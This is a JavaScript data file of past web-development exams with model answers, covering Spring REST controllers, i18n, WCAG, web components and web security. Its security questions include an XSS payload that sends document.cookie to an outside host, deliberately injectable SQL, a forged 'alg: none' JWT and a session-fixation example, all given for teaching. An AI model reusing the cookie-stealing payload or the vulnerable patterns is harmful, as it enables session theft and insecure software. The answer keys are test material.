/* Tidligere eksamener: v24, h23, h22, h21 */
window.DAT = window.DAT || {};
DAT.exams = DAT.exams || [];

const PROPS_STARTER = "# messages_en.properties\n\n\n# messages_no.properties\n";

DAT.exams.push({
  id: "v24", title: "Vår 2024", kind: "past", appendix: ["spring", "js"], note: "Oppgave 3 (custom tags) er fjernet – ikke pensum i år. Globalization-oppgaven brukte JSP; her lager du bare property-filene.",
  questions: [
    { title: "Question 1 – Web Frameworks and Services", weight: 30,
      intro: `<div class="figure"><b>SensorLocation model</b><br>Location: <code>PK id</code>, name, latitude, longitude, description &nbsp;|&nbsp; Sensor: <code>id</code>, name, type, unit &nbsp;|&nbsp; Measurements: <code>PK id</code>, <code>FK location_id</code>, <code>FK sensor_id</code>, value, timestamp</div>
<p>A sensor location (SensorLoc) web service. A location (e.g. Kronstad) can contain many sensors of different types (temperature, wind). An admin can create, update or delete a location and sensor metadata via REST endpoints. Each sensor sends its measurements to the service. An external user can request sensor measurements for different locations.</p>`,
      tasks: [
        { label: "a", type: "code", lang: "text", q: `<p>Build REST API endpoints for this service:</p><ul><li>Create, update and delete location metadata</li><li>Details of each location</li><li>List of all locations</li><li>Create, update and delete sensor metadata</li><li>Details of each sensor</li><li>List of all sensors</li><li>List of all measurements for all sensors in a location</li><li>Measurements for a sensor in a location</li></ul>`,
          starter: "Service | API Method | Endpoint (URI) | HTTP Method\nList all locations metadata | getLocations | /locations | GET\n",
          sol: `<table><tr><th>Service</th><th>API Method</th><th>Endpoint</th><th>HTTP</th></tr>
<tr><td>List all locations</td><td>getLocations</td><td>/locations</td><td>GET</td></tr>
<tr><td>Details of a location</td><td>getLocation</td><td>/locations/{id}</td><td>GET</td></tr>
<tr><td>Create a location</td><td>createLocation</td><td>/locations</td><td>POST</td></tr>
<tr><td>Update a location</td><td>updateLocation</td><td>/locations/{id}</td><td>PUT</td></tr>
<tr><td>Delete a location</td><td>deleteLocation</td><td>/locations/{id}</td><td>DELETE</td></tr>
<tr><td>Create a sensor</td><td>createSensor</td><td>/sensors (or /locations/{id}/sensors)</td><td>POST</td></tr>
<tr><td>List all sensors</td><td>getSensors</td><td>/sensors</td><td>GET</td></tr>
<tr><td>Details of a sensor</td><td>getSensor</td><td>/sensors/{id}</td><td>GET</td></tr>
<tr><td>Update a sensor</td><td>updateSensor</td><td>/sensors/{id}</td><td>PUT</td></tr>
<tr><td>Delete a sensor</td><td>deleteSensor</td><td>/sensors/{id}</td><td>DELETE</td></tr>
<tr><td>All measurements in a location</td><td>getSensorsLocData</td><td>/locations/{id}/measurements</td><td>GET</td></tr>
<tr><td>Measurements for a sensor in a location</td><td>getSensorLocData</td><td>/locations/{id}/measurements/{sensor_id}</td><td>GET</td></tr></table>` },
        { label: "b I", type: "code", lang: "java", q: `<p>You are provided with the Sensor Service and Measurement Service:</p>
~~~java
@Service
public class SensorService {
    @Autowired
    private SensorRepository sensorRepository;
    public Sensor saveSensor(Sensor sensor) { return sensorRepository.save(sensor); }
    public Sensor updateSensor(Sensor sensor, int id) throws SensorNotFoundException {
        findById(id);
        return sensorRepository.save(sensor);
    }
    public List<Sensor> findAll() { return (List<Sensor>) sensorRepository.findAll(); }
    public Sensor findById(long id) throws SensorNotFoundException {
        return sensorRepository.findById(id)
            .orElseThrow(() -> new SensorNotFoundException("Sensor not found!"));
    }
    public void deleteById(Long id) throws SensorNotFoundException {
        findById(id);
        sensorRepository.deleteById(id);
    }
}
@Service
public class MeasurementService {
    @Autowired
    private MeasurementRepository dataRepository;
    public List<Measurement> findAllSensorsByLocation(long id) {...}
    public List<Measurement> findSensorByLocation(Long lid, Long sid) throws MeasurementNotFoundException {...}
}
~~~
<p>Implement the controller class and methods for all the <b>sensor</b> REST API endpoints from a). Return appropriate HttpStatus codes. You can use SensorNotFoundException and MeasurementNotFoundException.</p>`,
          starter: `@RestController
@RequestMapping("/sensorloc/api/v1")
public class SensorMetadataController {

}
`,
          sol: `~~~java
@RestController
@RequestMapping("/sensorloc/api/v1")
public class SensorController {

    @Autowired
    private SensorService sensorService;

    @GetMapping("/sensors")
    @PreAuthorize("hasAuthority('USER')")
    public ResponseEntity<Object> getAllSensors() {
        List<Sensor> sensors = sensorService.findAll();
        if (sensors.isEmpty())
            return new ResponseEntity<>(HttpStatus.NO_CONTENT);
        return new ResponseEntity<>(sensors, HttpStatus.OK);
    }

    @GetMapping("/sensors/{id}")
    @PreAuthorize("hasAuthority('USER')")
    public ResponseEntity<Sensor> getSensor(@PathVariable("id") Long id)
            throws SensorNotFoundException {
        Sensor sensor = sensorService.findById(id);
        return new ResponseEntity<>(sensor, HttpStatus.OK);
    }

    @DeleteMapping("/sensors/{id}")
    @PreAuthorize("hasAuthority('ADMIN')")
    public ResponseEntity<Object> deleteSensorById(@PathVariable("id") Long id)
            throws SensorNotFoundException {
        sensorService.deleteById(id);
        return new ResponseEntity<>(HttpStatus.OK);
    }

    @PostMapping("/sensors")
    @PreAuthorize("hasAuthority('ADMIN')")
    public ResponseEntity<Sensor> createSensor(@RequestBody Sensor sensor) {
        sensor = sensorService.saveSensor(sensor);
        return new ResponseEntity<>(sensor, HttpStatus.CREATED);
    }

    @PutMapping("/sensors/{id}")
    @PreAuthorize("hasAuthority('ADMIN')")
    public ResponseEntity<Sensor> updateSensor(@RequestBody Sensor sensor,
            @PathVariable int id) throws SensorNotFoundException {
        sensor = sensorService.updateSensor(sensor, id);
        return new ResponseEntity<>(sensor, HttpStatus.OK);
    }
}
~~~` },
        { label: "b II", type: "code", lang: "java", q: `<p>Implement the controller class and methods for the <b>Measurement</b> REST API endpoints from a).</p>`,
          starter: `@RestController
@RequestMapping("/sensorloc/api/v1")
public class MeasurementController {

}
`,
          sol: `~~~java
@RestController
@RequestMapping("/sensorloc/api/v1")
public class MeasurementController {

    @Autowired
    private MeasurementService dataService;

    @GetMapping("/locations/{id}/measurements")
    @PreAuthorize("hasAuthority('USER')")
    public ResponseEntity<Object> getAllSensorsMeasurementsByLocation(@PathVariable("id") Long id) {
        List<Measurement> sloc = dataService.findAllSensorsByLocation(id);
        if (sloc.isEmpty())
            return new ResponseEntity<>(HttpStatus.NO_CONTENT);
        return new ResponseEntity<>(sloc, HttpStatus.OK);
    }

    @GetMapping("/locations/{id}/measurements/{sensor_id}")
    @PreAuthorize("hasAuthority('USER')")
    public ResponseEntity<Object> getSensorMeasurementsOfLocationId(
            @PathVariable("id") Long lid, @PathVariable("sensor_id") Long sid)
            throws MeasurementNotFoundException {
        List<Measurement> sloc = dataService.findSensorByLocation(lid, sid);
        if (sloc.isEmpty())
            return new ResponseEntity<>(HttpStatus.NO_CONTENT);
        return new ResponseEntity<>(sloc, HttpStatus.OK);
    }
}
~~~` },
        { label: "c I", type: "text", q: `<p>SensorLoc uses a 3rd party IdP based on OAuth2. Briefly explain the authorization flow using OAuth2 "authorization code grant type" between the resource owner and the IdP.</p>`, sol: "@authcodeFlow" },
        { label: "c II", type: "code", lang: "java", q: `<p>Roles ADMIN and USER in the JWT: ADMIN and USER are assigned to the admin, only USER to the user. Protect the endpoints in SensorMetadataController and MeasurementController using Spring annotations.</p>`, starter: "",
          sol: `<p>See b I and b II: create/update/delete use <code>@PreAuthorize("hasAuthority('ADMIN')")</code>, reading uses <code>@PreAuthorize("hasAuthority('USER')")</code>.</p>` }
      ]},
    { title: "Question 2 – Globalization", weight: 10, tasks: [
        { label: "a", type: "text", q: `<p>In your own words, briefly explain what globalization, internationalization, and localization are.</p>`, sol: "@g11n" },
        { label: "b", type: "code", lang: "properties", q: `<p>Internationalize the page and localize it to English and one other language. Write the property files.</p>
~~~html
<body>
    <div> The number of registered students is 20% more this year. The number of
    registrations between 01.05.2023 and 30.08.2023 is within the range of 50 and 100
    students. </div>
</body>
~~~`, starter: PROPS_STARTER,
          sol: `~~~properties
# Message_en.properties
desc=The number of registered students is {0} more this year. The number of registrations between {1} and {2} is within the range of {3} and {4} students.

# Message_no.properties
desc=Antall registrerte studenter er {0} flere i år. Antall registreringer mellom {1} og {2} er innenfor rekkevidden {3} og {4} studenter.
~~~` }
      ]},
    { title: "Question 4 – Universal Design", weight: 5, tasks: [
        { label: "a", type: "text", q: `<p>What is Web Content Accessibility Guidelines (WCAG)?</p>`, sol: "@wcag" },
        { label: "b", type: "text", q: `<p>Briefly discuss WCAG principle #1 – "Perceivable" and the guidelines for this principle.</p>`, sol: "@perceivable" }
      ]},
    { title: "Question 5 – Web security", weight: 25, tasks: [
        { label: "a", type: "text", q: `<p>Passwords can be stored securely by using 1) cryptographically secure hash, 2) slow hash algorithm, 3) unique per user salt, and 4) pepper. Explain the security benefits of using these four password storage features.</p>`, sol: "@pw4" },
        { label: "b", type: "text", q: `<p>An online banking application allows money transfer by filling in the account number of the sender and the recipient at https://besttransferservice.com/transfer. Once the customer submits, the customer is requested to approve the transaction using his password. Explain the type of CSRF mitigation described above.</p>`, sol: "@challengeResponse" },
        { label: "c", type: "text", q: `<p>You inspect the HTML source of an online blog at https://gossip.blog.com and find in one user's comment:</p>
~~~html
<script>document.write(\`<img src='' onerror='http://justpassingby.com/?'document.cookie/>\`);</script>
~~~
<p>Explain the types of vulnerability in this attack scenario.</p>`, sol: "@xssScenario" },
        { label: "d", type: "code", lang: "java", q: `<p>Given the SQL query below where username and password are user supplied data:</p>
~~~java
String sqlQuery = "SELECT * FROM ACCDB WHERE USERNAME = " + username + " and PASSWORD = " + password;
PreparedStatement stmt = conn.prepareStatement(sqlQuery);
stmt.executeUpdate();
~~~
<p>I) Briefly explain why this SQL query can be vulnerable to injection.<br>II) Mitigate the SQL injection vulnerability by writing the mitigation code.</p>`, sol: ["@sqliWhy", "@sqliFix"] },
        { label: "e", type: "text", q: `<p>A JWT consists of three parts: Header.Claims.Signature</p><p>I) Describe the two different ways to calculate the signature part.<br>II) Assume the JWT is signed with the secret key "bergen". Discuss the major threat to this token.</p>`, sol: ["@jwtSig", "@jwtWeak"] },
        { label: "f", type: "text", q: `<p>A client can access a protected resource by sending a request with a JWT to the Resource Server. Describe the security actions that the Resource Server must take before sending the protected resource to the client.</p>`, sol: "@rsChecks" }
      ]},
    { title: "Question 6 – JavaScript", weight: 20, tasks: [
        { label: "a i", type: "text", q: `<p>JavaScript frameworks can provide synchronization of state and view, and routing. What do we mean with "synchronization of state and view" in the context of JavaScript frameworks?</p>`,
          sol: `<ul><li><b>Synchronization of view from state:</b> any change in the state (model) updates the view.</li><li><b>Synchronization of state from view:</b> any change in the view (e.g. user input) updates the state.</li></ul>` },
        { label: "a ii", type: "text", q: `<p>What is meant by "routing" in the context of JavaScript frameworks? Describe an approach to routing with plain JavaScript using the hash sign "#". Your explanation must include the use of the event hashchange.</p>`, sol: "@routing" },
        { label: "a iii", type: "code", lang: "javascript", q: `<p>Object properties can be configured as e.g. writable and enumerable. Demonstrate with code how to set a property <code>surename</code> of an object <code>student</code> to not writable.</p>`, sol: `~~~javascript
Object.defineProperty(student, "surename", { writable: false });
~~~` },
        { label: "a iv", type: "text", q: `<p>What are the consequences if an object property is configured as enumerable?</p>`, sol: `<p>An enumerable property is included when looping through the object (e.g. <code>for…in</code>, <code>Object.keys</code>).</p>` },
        { label: "b", type: "code", lang: "javascript",
          q: `<p>Write the code of a GUI component <b>ProductInfo</b> used to add information for a product: <code>{ item: "Umbrella", price: 123 }</code>.</p>
<div class="figure mock"><fieldset><legend>Fill in product information</legend><input disabled placeholder="Product name"> <input disabled size="4" placeholder="Price"> <button type="button" disabled>Add product</button><div>Status: Data for "Umbrella" was saved</div></fieldset></div>
<p>Public methods:</p>
<ul><li><code>clear()</code>: sets the value of the input elements to empty strings.</li>
<li><code>showmessage(message)</code>: sets the text in the SPAN for the status message.</li>
<li><code>setproductcallback(callback)</code>: adds a callback that is run when the user clicks Add product, with a parameter product with data from the input elements.</li></ul>
<p><b>Task:</b> Fill in the missing code.</p>`,
          starter: `const template = document.createElement("template");
template.innerHTML = \`
    <fieldset>
        <legend>Fill in product information</legend>
        <div class="product">
            <input type="text" name="item" size="15" placeholder="Product name" required>
            <input type="text" name="price" size="4" placeholder="Price" required>
            <button>Add product</button>
        </div>
        <div class="message">Status: <span></span></div>
    </fieldset>\`;

class ProductInfo extends HTMLElement {
    // Add the necessary private fields

    constructor() {
        super();
        const shadow = this.attachShadow({ mode: 'closed' });
        const content = template.content.cloneNode(true);
        shadow.append(content);
        // More code
    }

    // More code
}
customElements.define('product-info', ProductInfo);
`,
          sol: `~~~javascript
class ProductInfo extends HTMLElement {
    #callbacks = new Map();
    #iteminput;
    #priceinput;
    #messageElement;

    constructor() {
        super();
        const shadow = this.attachShadow({ mode: 'closed' });
        const content = template.content.cloneNode(true);
        shadow.append(content);
        shadow.querySelector("button").addEventListener("click", () => { this.#addproduct() });
        const fs = shadow.querySelector("fieldset");
        this.#iteminput = fs.querySelector("input[name='item']");
        this.#priceinput = fs.querySelector("input[name='price']");
        this.#messageElement = fs.querySelector(".message > span");
    }

    clear() {
        this.#iteminput.value = "";
        this.#priceinput.value = "";
        this.showmessage("");
    }

    setproductcallback(method) {
        const callbackid = Symbol("productCallbackID");
        this.#callbacks.set(callbackid, method);
        return callbackid;
    }

    showmessage(message) {
        this.#messageElement.textContent = message;
    }

    #addproduct() {
        const item = this.#iteminput.value.trim();
        const price = this.#priceinput.value.trim();
        if (item === "" || price === "") return;
        const product = { item: item, price: price };
        this.#callbacks.forEach(callback => callback(product));
    }
}
customElements.define('product-info', ProductInfo);
~~~` },
        { label: "c", type: "code", lang: "javascript",
          q: `<p>ProductInfo is used by a parent component <b>StorageManager</b> to get information on new products that are stored on the server. The status of storing should be shown by ProductInfo.</p>
<p>StorageManager uses a private method <code>#storeOnServer(product)</code> (you do not implement it). It returns a Promise. The resolved object has properties <code>reponsestatus</code> (true if stored) and <code>product</code>. If problems with the connection, the Promise rejects.</p>
<p>Implement: 1. When the user clicks Add product in ProductInfo, the product is sent to the server. 2. On response, the status field of ProductInfo shows a message indicating success or failure.</p>`,
          starter: `template.innerHTML = "<product-info></product-info>";

class StorageManager extends HTMLElement {

}
customElements.define('storage-manager', StorageManager);
`,
          sol: `~~~javascript
template.innerHTML = "<product-info></product-info>";

class StorageManager extends HTMLElement {
    #pinfo;

    constructor() {
        super();
        const shadow = this.attachShadow({ mode: 'closed' });
        const content = template.content.cloneNode(true);
        shadow.append(content);
        this.#pinfo = shadow.querySelector("product-info");
        this.#pinfo.setproductcallback((product) => { this.#saveproduct(product) });
    }

    async #saveproduct(product) {
        try {
            const result = await this.#storeOnServer(product);
            if (result.reponsestatus) {
                this.#pinfo.clear();
                this.#pinfo.showmessage(\`Data for "\${product.item}" was saved\`);
            } else {
                this.#pinfo.showmessage(\`Failed to save data for "\${product.item}"\`);
            }
        } catch (error) {
            this.#pinfo.showmessage(\`Failed to save data for "\${product.item}"\`);
        }
    }

    #storeOnServer(product) { /* not implemented */ }
}
customElements.define('storage-manager', StorageManager);
~~~` }
      ]}
  ]
});

DAT.exams.push({
  id: "h23", title: "Høst 2023", kind: "past", appendix: ["spring", "js"], note: "Oppgave 3 (custom tags) er fjernet. Det finnes ingen offisiell løsning for h23 – løsningsforslagene er laget i samme stil som de andre årene.",
  questions: [
    { title: "Question 1 – Web Frameworks and Services", weight: 30,
      intro: `<div class="figure"><b>HotelOnline model</b><br>Hotel: <code>PK id</code>, name, city, country, description &nbsp;|&nbsp; Booking: <code>PK id</code>, <code>FK hotel_id</code>, <code>FK customer_id</code>, arrival, departure &nbsp;|&nbsp; Customer: <code>PK id</code>, firstname, lastname, address, others</div>
<p>A 3rd party company (HotelOnline) provides online hotel booking for customers worldwide.</p>`,
      tasks: [
        { label: "a", type: "code", lang: "text", q: `<p>Build REST API endpoints for this service:</p><ul><li>List of all hotels; details of a hotel; create, update, delete a hotel</li><li>List of all customers; details of each customer; create, update, delete a customer</li><li>List of all bookings; details of a specific booking</li><li>Customers can book a hotel, update a booking and cancel their booking</li><li>List of all bookings made by a customer</li></ul>`,
          starter: "Service | API Method | Endpoint (URI) | HTTP Method\nList all hotels | getHotels | /hotels | GET\n",
          sol: `<table><tr><th>Service</th><th>API Method</th><th>Endpoint</th><th>HTTP</th></tr>
<tr><td>List all hotels</td><td>getHotels</td><td>/hotels</td><td>GET</td></tr>
<tr><td>Details of a hotel</td><td>getHotel</td><td>/hotels/{id}</td><td>GET</td></tr>
<tr><td>Create a hotel</td><td>createHotel</td><td>/hotels</td><td>POST</td></tr>
<tr><td>Update a hotel</td><td>updateHotel</td><td>/hotels/{id}</td><td>PUT</td></tr>
<tr><td>Delete a hotel</td><td>deleteHotel</td><td>/hotels/{id}</td><td>DELETE</td></tr>
<tr><td>List all customers</td><td>getCustomers</td><td>/customers</td><td>GET</td></tr>
<tr><td>Details of a customer</td><td>getCustomer</td><td>/customers/{id}</td><td>GET</td></tr>
<tr><td>Create a customer</td><td>createCustomer</td><td>/customers</td><td>POST</td></tr>
<tr><td>Update a customer</td><td>updateCustomer</td><td>/customers/{id}</td><td>PUT</td></tr>
<tr><td>Delete a customer</td><td>deleteCustomer</td><td>/customers/{id}</td><td>DELETE</td></tr>
<tr><td>List all bookings</td><td>getBookings</td><td>/bookings</td><td>GET</td></tr>
<tr><td>Details of a booking</td><td>getBooking</td><td>/bookings/{bid}</td><td>GET</td></tr>
<tr><td>Book a hotel</td><td>createBooking</td><td>/customers/{id}/bookings</td><td>POST</td></tr>
<tr><td>Update a booking</td><td>updateBooking</td><td>/customers/{id}/bookings/{bid}</td><td>PUT</td></tr>
<tr><td>Cancel a booking</td><td>cancelBooking</td><td>/customers/{id}/bookings/{bid}</td><td>DELETE</td></tr>
<tr><td>Bookings by a customer</td><td>getCustomerBookings</td><td>/customers/{id}/bookings</td><td>GET</td></tr></table>` },
        { label: "b I", type: "code", lang: "java", q: `<p>You are given the Customer model that aggregates Booking objects, and the CustomerRepository:</p>
~~~java
@Entity
public class Customer {
    private Long id;
    private Set<Booking> bookings = new HashSet<>();
    public Set<Booking> getBookings() { return bookings; }
    public void addBooking(Booking booking) { bookings.add(booking); }
    public void removeBooking(Booking booking) { bookings.remove(booking); }
    ...
}
public interface CustomerRepository extends CrudRepository<Customer, Long> {
    List<Customer> findAll();
    Optional<Customer> findById(Long id);
    Customer save(Customer customer);
    void delete(Customer customer);
}
~~~
<p>Implement the controller class and the methods for all the <b>Customer</b> REST API endpoints from a). Return appropriate HttpStatus codes. You can use CustomerNotFoundException and BookingNotFoundException.</p>`,
          starter: `@RestController
@RequestMapping("/hotelonline/api/v1")
public class CustomerController {

}
`,
          sol: `~~~java
@RestController
@RequestMapping("/hotelonline/api/v1")
public class CustomerController {

    @Autowired
    private CustomerService customerService;

    @GetMapping("/customers")
    @PreAuthorize("hasAuthority('ADMIN')")
    public ResponseEntity<Object> getCustomers() {
        List<Customer> customers = customerService.findAll();
        if (customers.isEmpty())
            return new ResponseEntity<>(HttpStatus.NO_CONTENT);
        return new ResponseEntity<>(customers, HttpStatus.OK);
    }

    @GetMapping("/customers/{id}")
    @PreAuthorize("hasAuthority('USER')")
    public ResponseEntity<Object> getCustomer(@PathVariable("id") Long id)
            throws CustomerNotFoundException {
        return new ResponseEntity<>(customerService.findById(id), HttpStatus.OK);
    }

    @PostMapping("/customers")
    @PreAuthorize("hasAuthority('USER')")
    public ResponseEntity<Object> createCustomer(@RequestBody Customer customer) {
        return new ResponseEntity<>(customerService.saveCustomer(customer), HttpStatus.CREATED);
    }

    @PutMapping("/customers/{id}")
    @PreAuthorize("hasAuthority('USER')")
    public ResponseEntity<Object> updateCustomer(@RequestBody Customer customer,
            @PathVariable("id") Long id) throws CustomerNotFoundException {
        return new ResponseEntity<>(customerService.updateCustomer(customer, id), HttpStatus.OK);
    }

    @DeleteMapping("/customers/{id}")
    @PreAuthorize("hasAuthority('ADMIN')")
    public ResponseEntity<Object> deleteCustomer(@PathVariable("id") Long id)
            throws CustomerNotFoundException {
        customerService.deleteCustomer(id);
        return new ResponseEntity<>(HttpStatus.OK);
    }

    @GetMapping("/customers/{id}/bookings")
    @PreAuthorize("hasAuthority('USER')")
    public ResponseEntity<Object> getCustomerBookings(@PathVariable("id") Long id)
            throws CustomerNotFoundException {
        Set<Booking> bookings = customerService.findBookings(id);
        if (bookings.isEmpty())
            return new ResponseEntity<>(HttpStatus.NO_CONTENT);
        return new ResponseEntity<>(bookings, HttpStatus.OK);
    }

    @PostMapping("/customers/{id}/bookings")
    @PreAuthorize("hasAuthority('USER')")
    public ResponseEntity<Object> createBooking(@PathVariable("id") Long id,
            @RequestBody Booking booking) throws CustomerNotFoundException {
        return new ResponseEntity<>(customerService.addBooking(id, booking), HttpStatus.CREATED);
    }

    @PutMapping("/customers/{id}/bookings/{bid}")
    @PreAuthorize("hasAuthority('USER')")
    public ResponseEntity<Object> updateBooking(@PathVariable("id") Long id,
            @PathVariable("bid") Long bid, @RequestBody Booking booking)
            throws CustomerNotFoundException, BookingNotFoundException {
        return new ResponseEntity<>(customerService.updateBooking(id, bid, booking), HttpStatus.OK);
    }

    @DeleteMapping("/customers/{id}/bookings/{bid}")
    @PreAuthorize("hasAuthority('USER')")
    public ResponseEntity<Object> cancelBooking(@PathVariable("id") Long id,
            @PathVariable("bid") Long bid)
            throws CustomerNotFoundException, BookingNotFoundException {
        return new ResponseEntity<>(customerService.cancelBooking(id, bid), HttpStatus.OK);
    }
}
~~~` },
        { label: "b II", type: "code", lang: "java", q: `<p>Write the service class and the methods for the controller class in I).</p>`,
          starter: `@Service
public class CustomerService {

}
`,
          sol: `~~~java
@Service
public class CustomerService {

    @Autowired
    private CustomerRepository customerRepository;

    public List<Customer> findAll() {
        return customerRepository.findAll();
    }

    public Customer findById(Long id) throws CustomerNotFoundException {
        return customerRepository.findById(id)
            .orElseThrow(() -> new CustomerNotFoundException("Customer not found!"));
    }

    public Customer saveCustomer(Customer customer) {
        return customerRepository.save(customer);
    }

    public Customer updateCustomer(Customer customer, Long id) throws CustomerNotFoundException {
        findById(id);
        customer.setId(id);
        return customerRepository.save(customer);
    }

    public void deleteCustomer(Long id) throws CustomerNotFoundException {
        Customer customer = findById(id);
        customerRepository.delete(customer);
    }

    public Set<Booking> findBookings(Long id) throws CustomerNotFoundException {
        return findById(id).getBookings();
    }

    public Set<Booking> addBooking(Long id, Booking booking) throws CustomerNotFoundException {
        Customer customer = findById(id);
        customer.addBooking(booking);
        return customerRepository.save(customer).getBookings();
    }

    public Booking findBooking(Long id, Long bid)
            throws CustomerNotFoundException, BookingNotFoundException {
        return findById(id).getBookings().stream()
            .filter(b -> b.getId().equals(bid))
            .findFirst()
            .orElseThrow(() -> new BookingNotFoundException("Booking not found!"));
    }

    public Set<Booking> updateBooking(Long id, Long bid, Booking booking)
            throws CustomerNotFoundException, BookingNotFoundException {
        Customer customer = findById(id);
        customer.removeBooking(findBooking(id, bid));
        booking.setId(bid);
        customer.addBooking(booking);
        return customerRepository.save(customer).getBookings();
    }

    public Set<Booking> cancelBooking(Long id, Long bid)
            throws CustomerNotFoundException, BookingNotFoundException {
        Customer customer = findById(id);
        customer.removeBooking(findBooking(id, bid));
        return customerRepository.save(customer).getBookings();
    }
}
~~~` },
        { label: "c I", type: "text", q: `<p>HotelOnline uses a 3rd party IdP based on OAuth2. Briefly explain the authorization flow using the OAuth2 "resource owner credentials/password grant" between the resource owner and the IdP.</p>`, sol: "@passwordGrant" },
        { label: "c II", type: "code", lang: "java", q: `<p>Roles ADMIN and USER in the JWT: ADMIN and USER assigned to staff, only USER to customers. Protect the endpoints in CustomerController using relevant Spring annotations.</p>`, starter: "",
          sol: `<p>See b I: listing and deleting customers use <code>@PreAuthorize("hasAuthority('ADMIN')")</code>, the customer's own endpoints use <code>@PreAuthorize("hasAuthority('USER')")</code> (staff also has USER).</p>` }
      ]},
    { title: "Question 2 – Globalization", weight: 10, tasks: [
        { label: "a", type: "text", q: `<p>In your own words, briefly explain what globalization, internationalization, and localization are.</p>`, sol: "@g11n" },
        { label: "b", type: "code", lang: "properties", q: `<p>Internationalize the page and localize it to English and one other language. Write the property files.</p>
~~~html
<body>
    <h1>DAT152 Exam info</h1>
    <div> This course has between 50 and 100 registered students</div>
    <table border="1">
        <tr><td><b>Date:</b>11.12.2023</td></tr>
        <tr><td><b>Total duration:</b>4 hours</td></tr>
        <tr><td><b>Type:</b>Written exam</td></tr>
        <tr><td><b>Pass mark:</b>You need more than 39.9% correct answers to pass</td></tr>
    </table>
</body>
~~~`, starter: PROPS_STARTER,
          sol: `~~~properties
# messages_en.properties
title=DAT152 Exam info
students=This course has between {0} and {1} registered students
date=Date:
duration=Total duration:
duration.value={0} hours
type=Type:
type.value=Written exam
passmark=Pass mark:
passmark.value=You need more than {0} correct answers to pass

# messages_no.properties
title=DAT152 Eksamensinfo
students=Dette emnet har mellom {0} og {1} registrerte studenter
date=Dato:
duration=Varighet:
duration.value={0} timer
type=Type:
type.value=Skriftlig eksamen
passmark=Krav for bestått:
passmark.value=Du må ha mer enn {0} riktige svar for å bestå
~~~` }
      ]},
    { title: "Question 4 – Universal Design", weight: 5, tasks: [
        { label: "a", type: "text", q: `<p>What is Web Content Accessibility Guidelines (WCAG)?</p>`, sol: "@wcag" },
        { label: "b", type: "text", q: `<p>Briefly discuss WCAG principle #2 – "Operable" and the guidelines for this principle.</p>`, sol: "@operable" }
      ]},
    { title: "Question 5 – Web security", weight: 25, tasks: [
        { label: "a", type: "text", q: `<p>A software development lifecycle consists of requirement, design, implementation, testing, and deployment/release phases. Mention one approach to identify security defects in each phase.</p>`, sol: "@ssdlc" },
        { label: "b", type: "code", lang: "java", q: `<p>Given the SQL query below where name and email are user supplied data:</p>
~~~java
String sqlQuery = "INSERT INTO USERS (id, name, email) VALUES ('"+id+"','"+name+"','"+email+"')";
PreparedStatement stmt = conn.prepareStatement(sqlQuery);
stmt.executeUpdate();
~~~
<p>I) Briefly explain why this SQL query can be vulnerable to injection.<br>II) Mitigate the SQL injection vulnerability by writing the mitigation code.</p>`,
          sol: `<p>The untrusted data is concatenated into the SQL string before it is passed to <code>prepareStatement</code>, so the input becomes part of the SQL code and the PreparedStatement does not protect.</p>
~~~java
String sqlQuery = "INSERT INTO USERS (id, name, email) VALUES (?, ?, ?)";
PreparedStatement stmt = conn.prepareStatement(sqlQuery);
stmt.setString(1, id);
stmt.setString(2, name);
stmt.setString(3, email);
stmt.executeUpdate();
~~~` },
        { label: "c", type: "text", q: `<p>Briefly explain the difference between XSS and CSRF.</p><p>I) Describe how output encoding works to mitigate XSS.<br>II) Describe the synchronizer token pattern for mitigating CSRF.</p>`, sol: ["@xssVsCsrf", "@outputEncoding", "@syncToken"] },
        { label: "d", type: "text", q: `<p>What major session vulnerability can you see in the authentication controller below?</p>
~~~java
1.  protected void doPost(HttpServletRequest request,
2.          HttpServletResponse response) throws ServletException, IOException {
3.      boolean successfulLogin = false;
4.      String username = validate(request.getParameter("username"));
5.      String password = validate(request.getParameter("password"));
6.      if (username != null && password != null) {
7.          AppUser authUser = getAuthenticatedUser(username, password);
8.          if (authUser != null) {
9.              successfulLogin = true;
10.             request.getSession().setAttribute("user", authUser);
11.         }
12.     }
13.     // do authenticated stuff...
14. }
~~~`, sol: "@fixation" },
        { label: "e", type: "text", q: `<p>A JWT consists of three parts: Header.Claims.Signature</p><p>I) Describe the two different ways to derive the signature part.<br>II) Assume the JWT is signed with the secret key "victory". Discuss the major threat to this token.</p>`, sol: ["@jwtSig", "@jwtWeak"] },
        { label: "f", type: "text", q: `<p>jjwt from Oblig4 has two methods: <code>parse(token)</code> and <code>parseClaimsJws(token)</code>. Given the modified JWTs:</p>
<p><b>JWT #1</b> – header <code>{"alg": "none"}</code>, payload <code>{"iat": 1572038943, "admin": "true", "user": "Jerry"}</code>, signature removed.<br>
<b>JWT #2</b> – header <code>{"alg": "RS256"}</code>, same modified payload, with an old signature.</p>
~~~java
1.  try {
2.      Jwt jwt = Jwts.parser().setSigningKey(KEY).parseClaimsJws(accessToken);
3.      Claims claims = (Claims) jwt.getBody();
4.      String user = (String) claims.get("user");
5.      boolean isAdmin = Boolean.valueOf((String) claims.get("admin"));
6.      if (isAdmin) {
7.          removeAllUsers();
8.      } else {
9.          log.error("You are not an admin user");
10.     }
11. } catch (JwtException e) {
12.     throw new InvalidTokenException(e);
13. }
~~~
<p>Results can be: (1) InvalidTokenException in line 12, (2) removeAllUsers() in line 7, (3) log error in line 9. Discuss the results for JWT #1 and JWT #2.</p>`, sol: "@jwtParseClaims" },
        { label: "g", type: "text", q: `<p>Passwords can be stored securely by using 1) cryptographically secure hash, 2) slow hash algorithm, 3) unique per user salt, and 4) pepper. Discuss the security benefits of using these four password storage features.</p>`, sol: "@pw4" }
      ]},
    { title: "Question 6 – JavaScript", weight: 20, tasks: [
        { label: "a i", type: "text", q: `<p>Give examples of situations where JavaScript code will be run asynchronously. You are not asked to write code. You must clearly explain the asynchronous behaviour of your examples.</p>`, sol: "@asyncExamples" },
        { label: "a ii", type: "text", q: `<p>The browser is running asynchronously a piece of JavaScript code that is blocking. How does this affect the browser and the application? You must explain your answer.</p>`, sol: "@blocking" },
        { label: "a iii", type: "code", lang: "javascript", q: `<p>The code below uses async and await:</p>
~~~javascript
async function myFunction() {
    try {
        const answer = await waitforSomething();
        console.log(\`Resolved with value "\${answer}"\`);
    } catch (e) {
        console.log(\`Rejected with "\${e.message}"\`);
    }
}
~~~
<p>What kind of ECMA object must the function waitforSomething return? Write code for a possible waitforSomething function. The returned object should include some asynchronous code.</p>`, sol: ["<p>It must return a <b>Promise</b>.</p>", "@promiseCode"] },
        { label: "b", type: "code", lang: "javascript",
